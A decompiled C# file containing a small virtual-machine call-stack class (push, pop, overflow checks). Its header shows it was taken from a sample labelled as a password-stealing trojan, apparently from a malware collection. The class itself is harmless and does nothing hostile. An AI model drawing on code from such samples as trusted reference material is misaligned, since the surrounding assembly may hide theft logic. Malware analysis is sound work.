// Decompiled with JetBrains decompiler
// Type: org.lb.lbvm.runtime.CallStack
// Assembly: ISectionEnt, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 94D57F93-A342-4E0D-9A4D-9518717BA689
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.01-msil\Trojan-PSW.Win32.Stealer.aezv-723abb6b0dee5d6f012a695ca483478595a08ba3b0dc73ca2032c8d4699605cb.exe

using org.lb.lbvm.exceptions;

namespace org.lb.lbvm.runtime
{
  internal sealed class CallStack
  {
    private readonly int[] ipStack = new int[1024];
    private readonly int[] numberOfParametersStack = new int[1024];
    private int count;

    public void Push(int ip, int numberOfParameters)
    {
      if (this.count == this.ipStack.Length - 1)
        throw new RuntimeException("Call stack overflow");
      this.ipStack[this.count] = ip;
      this.numberOfParametersStack[this.count] = numberOfParameters;
      ++this.count;
    }

    public void Pop()
    {
      if (this.count == 0)
        throw new RuntimeException("Call stack underflow");
      --this.count;
    }

    public int GetLastIp() => this.ipStack[this.count - 1];

    public int GetLastNumberOfParameters() => this.numberOfParametersStack[this.count - 1];

    public int Count() => this.count;
  }
}
